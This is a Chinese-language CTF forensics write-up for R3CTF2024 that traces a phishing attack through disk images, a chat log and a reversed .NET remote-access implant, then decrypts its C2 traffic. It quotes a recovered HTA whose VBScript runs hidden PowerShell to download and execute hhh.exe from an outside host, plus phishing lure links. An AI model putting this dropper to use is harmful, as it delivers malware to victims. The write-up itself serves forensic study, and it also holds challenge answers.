---
title: "R3CTF2024 Forensics一点点WP"
source: "https://zysgmzb.club/index.php/archives/317"
author:
published:
created: 2026-06-10
description: "这次比赛拿到了所有被解出的forensics题目的一血，开心了，发个wp   TPA 01-🌐 14G巨大附件，还好网速可以 :p 取证大师打开，一眼就看到了里"
tags:
  - "clippings"
---
---
title: "R3CTF2024 Forensics一点点WP"
source: "https://zysgmzb.club/index.php/archives/317"
author: ""
published: ""
created: "2026-06-10T21:23:47+08:00"
description: "这次比赛拿到了所有被解出的forensics题目的一血，开心了，发个wp   TPA 01-🌐 14G巨大附件，还好网速可以 :p 取证大师打开，一眼就看到了里"
tags: [clippings]
---

# R3CTF2024 Forensics一点点WP

> 这次比赛拿到了所有被解出的forensics题目的一血，开心了，发个wp

![](https://pic.imgdb.cn/item/6666ae065e6d1bfa05009572.png)

## TPA 01-🌐

14G巨大附件，还好网速可以:p

取证大师打开，一眼就看到了里面的wsl

![](https://pic.imgdb.cn/item/66658cbb5e6d1bfa05d033ad.png)

思路一下就清晰了，去找wsl的磁盘文件就好了

位置如下

```
复制代码分区2_本地磁盘[D]:\Users\r3kapig\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\ext4.vhdx
```

dump下来再拖进取证大师，得到根目录下的F14G文件

```
复制代码Hi players,welcome !Ops,what's that?2d422fc7f2c628c55520984c0673964eb5454dea72f79b1022a34728294c5bf8I guess u need a key to decrypt it.SELECT something FROM somewhere with the windows10 lol~
```

看到最后一段话就知道key可能就在原来的机器里面的mysql里，直接去找

![](https://pic.imgdb.cn/item/66658c9f5e6d1bfa05d01811.png)

然后就可以发现里面的jpg图片，提取出来就可以看见key了

![](https://pic.imgdb.cn/item/66658ce95e6d1bfa05d05c9e.jpg)

直接解密即可

![](https://pic.imgdb.cn/item/66658d145e6d1bfa05d084c6.png)

## TPA 02 - 📱

按照题目描述就知道流量包里面是被钓鱼时候的流量，直接翻就看到密码了

![](https://pic.imgdb.cn/item/66658dda5e6d1bfa05d138a1.png)

密码为

```
复制代码l0v3_aNd_peace
```

然后去手机里找电话号码，由于是钓鱼，就想到了通讯录之类的东西，于是直接在Peggy/data/data/com.android.providers.telephony/databases里找到了两个电话号码，拼起来就行

![](https://pic.imgdb.cn/item/66658eab5e6d1bfa05d1f4cf.png)

```
复制代码r3ctf{15555215558_l0v3_aNd_peace}
```

## TPA 03 - 💻

由于手机里是钓鱼，于是可以在这里的电脑里继续搜索钓鱼的痕迹，可以发现看过这样一个网页

```
复制代码C_Users_TPA/TPA/AppData/Local/Microsoft/Windows/INetCache/IE/ZMSHFBYP/temp[1].hta
```

内容如下

```
复制代码<script language="VBScript">    Function var_func()        Dim open_pdf            Set open_pdf = CreateObject("Wscript.Shell")            open_pdf.run "powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.30.1:8088/duanwufangjia.pdf',$env:temp+'/duanwufangjia.pdf');Start-Process $env:temp'/duanwufangjia.pdf'", 0, true        Dim hta        Set var_hta = CreateObject("Wscript.Shell")        var_hta.run "powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.30.1:8088/hhh.exe',$env:temp+'/hhh.exe');Start-Process $env:temp'/hhh.exe'", 0, true    End Function    var_func    self.close</script>
```

可以看到下载了duanwufangjia.pdf和hhh.exe，并且都放在了temp里面，直接去找就可以

![](https://pic.imgdb.cn/item/66658fdc5e6d1bfa05d30a04.png)

同时在桌面上可以发现Gajim.lnk，这是一款通信软件，则猜测在这里实施了钓鱼，于是去找他数据库，在C\_Users\_TPA/TPA/AppData/Roaming/Gajim/Logs.db

里面就有聊天记录，如下

```
复制代码小 T，把 flag 发给我一下，记得加密。-----BEGIN PGP MESSAGE-----hF4DQOZFkOnTo78SAQdAaOkhX64uECdRxqrvFjUAgGkefY/lVoFp2rnn7I9lKwcw5LN5bO2Y0PDbp8vkHMIWh4HAgERjvBkdBATFW3pFIZWB7JjNxJd0+vO0ENVUV8XG1MAhAQkCEGBAK0C+LBjxWsPdHPKhFyNzJPC/tDGAbTB5sB8bb/VLmToqPIbRfEliXhf6uZ7CDWMkyVWQQKwoyUIprDBUguKx4/smci99rLKbVeStKK/7j5ZyJAHc4lqKdhxAHTurzQsgR+yhDOVCiA/vIkfMBxFb7rwBXPNgJbv5lFMuqFbIjR4Btw3BbY901fG4SF69fljKrW3KdM1zyLWODxio682rCxc4OjViKaEZpE7680WApOhDGmIPy4SPzJU+s6U9LMvNIgGCJAE7SWrexssYhsqx4cuVK0R/VVck4pgy=YxnN-----END PGP MESSAGE-----请查收端午节放假安排。http://192.168.30.1:8088/%E7%AB%AF%E5%8D%88%E8%8A%82%E6%94%BE%E5%81%87%E5%AE%89%E6%8E%92.pdf.lnk怎么打不开？很抱歉，先前下发的文件损坏，新文件见 http://192.168.30.1:8088/%E7%AB%AF%E5%8D%88%E8%8A%82%E6%94%BE%E5%81%87%E5%AE%89%E6%8E%92.zip请查收端午节放假安排。http://192.168.30.1:8088/%E7%AB%AF%E5%8D%88%E8%8A%82%E6%94%BE%E5%81%87%E5%AE%89%E6%8E%92.zip
```

很明显就是在这里实施的钓鱼并下载了hhh.exe

然后就是对于hhh.exe的逆向了，这里使用dnspy直接打开会发现原文件经过了混淆

![](https://pic.imgdb.cn/item/666590215e6d1bfa05d3493f.png)

使用github上的项目de4dot-cex即可去除混淆，得到大致的逻辑

![](https://pic.imgdb.cn/item/6665912f5e6d1bfa05d45197.png)

Class1里面有c2通信的逻辑，GClass0是一些配置信息，GCLass1里面有两个很大的buffer

先看这两个大buffer，根据逻辑

![](https://pic.imgdb.cn/item/666592065e6d1bfa05d51cf8.png)

全部提取出来后放进cyberchef就可以解压缩，出来是两个dll

![](https://pic.imgdb.cn/item/666663a85e6d1bfa05947076.png)

一个是PacketLib一个是offline

然后看Class1里面的通信逻辑

![](https://pic.imgdb.cn/item/666592be5e6d1bfa05d5c9b3.png)

其实就是将payload经过PacketLib里面的序列化方法序列化之后再把长度添加到前面然后直接发送出去，于是去看之前提取出来的PacketLib.dll里面序列化的逻辑

![](https://pic.imgdb.cn/item/666592cf5e6d1bfa05d5db52.png)

逻辑就是经过了一个QuickLZ压缩之后使用RSMEncrypt去加密，继续深入，查看RSMEncrypt

![](https://pic.imgdb.cn/item/666593185e6d1bfa05d61f6b.png)

这里就很明了了，使用输入的key和8位\\x00的salt进行密钥派生得到了key和iv并将其运用于aescbc加密，最后把16字节的guid放前面

密钥派生的过程，可以直接使用python，salt为\\x00\*8，key则是GClass0.string\_0经过了Encoding.Unicode.GetBytes处理，GClass0.string\_0可以直接看到是123456789

![](https://pic.imgdb.cn/item/666593bf5e6d1bfa05d6b189.png)

将其转变为UTF-16编码，即每个后面加个\\x00

然后用脚本进行密钥派生得到key和iv

```
复制代码from Crypto.Cipher import AESfrom Crypto.Protocol import KDFsalt = b"\x00"*8key = bytes.fromhex("310032003300340035003600370038003900")key_bytes = KDF.PBKDF2(key, salt, dkLen=32, count=1)print("key: ", key_bytes[:16].hex())print("iv: ", key_bytes[16:].hex())
```

![](https://pic.imgdb.cn/item/666594995e6d1bfa05d77b92.png)

然后对一开始的document文件夹里面的DFIR.pcapng里的通信流量进行解密，通信端口为GClass0里的9875，先看tcp.stream eq 0

![](https://pic.imgdb.cn/item/666663b95e6d1bfa05947f4e.png)

对上面一部分进行解密，前几个是长度和类型，去掉即可

![](https://pic.imgdb.cn/item/666663c85e6d1bfa05948b76.png)

可以看到已经初具雏形，但是还不够，因为还有一道QuickLZ，这里找了好久也没有找到合适的python实现，于是直接复制了PacketLib.dll里的解压缩函数

```
复制代码using System;using System.IO;using System.Reflection;using System.Text;class Program{    public static byte[] Decompress(byte[] source)    {        int num = xxx;        int num2 = 9;        int i = 0;        uint num3 = 1U;        byte[] array = new byte[num];        int[] array2 = new int[4096];        byte[] array3 = new byte[4096];        int num4 = num - 6 - 4 - 1;        int j = -1;        uint num5 = 0U;        int num6 = source[0] >> 2 & 3;        if (num6 != 1 && num6 != 3)        {            throw new ArgumentException("C# version only supports level 1 and 3");        }        if ((source[0] & 1) != 1)        {            byte[] array4 = new byte[num];            Array.Copy(source, 9, array4, 0, num);            return array4;        }        for (; ; )        {            if (num3 == 1U)            {                num3 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);                num2 += 4;                if (i <= num4)                {                    if (num6 == 1)                    {                        num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16);                    }                    else                    {                        num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);                    }                }            }            if ((num3 & 1U) == 1U)            {                num3 >>= 1;                uint num8;                uint num9;                if (num6 == 1)                {                    int num7 = (int)num5 >> 4 & 4095;                    num8 = (uint)array2[num7];                    if ((num5 & 15U) != 0U)                    {                        num9 = (num5 & 15U) + 2U;                        num2 += 2;                    }                    else                    {                        num9 = (uint)source[num2 + 2];                        num2 += 3;                    }                }                else                {                    uint num10;                    if ((num5 & 3U) == 0U)                    {                        num10 = (num5 & 255U) >> 2;                        num9 = 3U;                        num2++;                    }                    else if ((num5 & 2U) == 0U)                    {                        num10 = (num5 & 65535U) >> 2;                        num9 = 3U;                        num2 += 2;                    }                    else if ((num5 & 1U) == 0U)                    {                        num10 = (num5 & 65535U) >> 6;                        num9 = (num5 >> 2 & 15U) + 3U;                        num2 += 2;                    }                    else if ((num5 & 127U) != 3U)                    {                        num10 = (num5 >> 7 & 131071U);                        num9 = (num5 >> 2 & 31U) + 2U;                        num2 += 3;                    }                    else                    {                        num10 = num5 >> 15;                        num9 = (num5 >> 7 & 255U) + 3U;                        num2 += 4;                    }                    num8 = (uint)((long)i - (long)((ulong)num10));                }                array[i] = array[(int)num8];                array[i + 1] = array[(int)(num8 + 1U)];                array[i + 2] = array[(int)(num8 + 2U)];                int num11 = 3;                while ((long)num11 < (long)((ulong)num9))                {                    array[i + num11] = array[(int)(checked((IntPtr)(unchecked((ulong)num8 + (ulong)((long)num11)))))];                    num11++;                }                i += (int)num9;                if (num6 == 1)                {                    num5 = (uint)((int)array[j + 1] | (int)array[j + 2] << 8 | (int)array[j + 3] << 16);                    while ((long)j < (long)i - (long)((ulong)num9))                    {                        j++;                        int num7 = (int)((num5 >> 12 ^ num5) & 4095U);                        array2[num7] = j;                        array3[num7] = 1;                        num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)array[j + 3] << 16)));                    }                    num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16);                }                else                {                    num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);                }                j = i - 1;            }            else            {                if (i > num4)                {                    break;                }                array[i] = source[num2];                i++;                num2++;                num3 >>= 1;                if (num6 == 1)                {                    while (j < i - 3)                    {                        j++;                        int num12 = (int)array[j] | (int)array[j + 1] << 8 | (int)array[j + 2] << 16;                        int num7 = (num12 >> 12 ^ num12) & 4095;                        array2[num7] = j;                        array3[num7] = 1;                    }                    num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)source[num2 + 2] << 16)));                }                else                {                    num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)source[num2 + 2] << 16)) | (ulong)((long)((long)source[num2 + 3] << 24)));                }            }        }        while (i <= num - 1)        {            if (num3 == 1U)            {                num2 += 4;                num3 = 2147483648U;            }            array[i] = source[num2];            i++;            num2++;            num3 >>= 1;        }        return array;    }    static void Main(string[] args)    {        byte[] compressedData = { };        byte[] result = Decompress(compressedData);        string res = string.Join("", result.Select(b => b.ToString("X2")));        Console.WriteLine(Encoding.UTF8.GetString(result));        Console.WriteLine(res);    }}
```

需要修改的分别是第十行的长度和178行的压缩后的payload

长度很好看，即解密后payload去除开头的16字节guid后的第六位往后四个，小端序

![](https://pic.imgdb.cn/item/666596335e6d1bfa05d90a19.png)

然后直接转成10进制数组放进代码里解密就可以了

![](https://pic.imgdb.cn/item/6665968b5e6d1bfa05d95e22.png)

这样就解密出了c2的通信内容，方便起见，这里不在贴出后面命令的截图了，直接给

```
复制代码
```

可以发现把gnupg打了个包，于是在流量里找到它并解密，在tcp.stream eq 15

解密结果如下，可以清晰看到这是个zip压缩包

![](https://pic.imgdb.cn/item/666599de5e6d1bfa05dcd5aa.png)

解压即可得到被删除的gnupg文件夹里面原本的内容，直接用这个文件夹将本地的gnupg文件夹覆盖即可读到里面的私钥

![](https://pic.imgdb.cn/item/66659a155e6d1bfa05dd0305.png)

直接解密先前的pgp message即可

![](https://pic.imgdb.cn/item/66659a375e6d1bfa05dd2236.png)